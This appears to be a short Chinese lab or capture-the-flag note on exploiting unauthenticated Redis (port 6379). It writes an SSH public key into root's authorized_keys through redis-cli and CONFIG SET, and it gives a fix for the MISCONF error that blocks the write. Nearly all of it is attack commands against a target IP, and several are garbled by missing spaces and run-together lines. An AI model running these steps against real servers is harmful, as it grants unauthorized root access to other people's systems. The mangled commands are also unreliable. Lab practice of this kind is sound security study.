  • redis未授权-ssh公钥写入

扫描发现存在6379，尝试使用未授权

redis-server -h 192.168.2.102

 


靶机只要给了6379，一般就都会有这洞结合ssh可以使用 redis ssh公钥写入

ssh-keygen -t rsa(echo-e"\n\n";cat/root/.ssh/id_rsa.pub;echo-e"\n\n")>key.txt cat key.txt | redis-cli -h192.168.2.102 -x setxxx



接下来设置redis的备份目录和保存名

config set dir /root/.sshconfig set dbfilename authorized_keys save

  • 靶机坑点1

 

当写入redis时可能会发生这种错误

(error)MISCONFRedisisconfiguredtosaveRDBsnapshots,butiscurrentlynotabletopersistondisk.Commandsthatmaymodifythedatasetaredisabled.PleasecheckRedislogsfordetails about theerror.

解决方案：

运行config set stop-writes-on-bgsave-error no 命令后，关闭配置项stop-writes-on-bgsave-error解决该问题。root@ubuntu:/usr/local/redis/bin#./redis-cli 127.0.0.1:6379> config set stop-writes-on-bgsave-error no OK127.0.0.1:6379> lpush myColour"red"(integer)
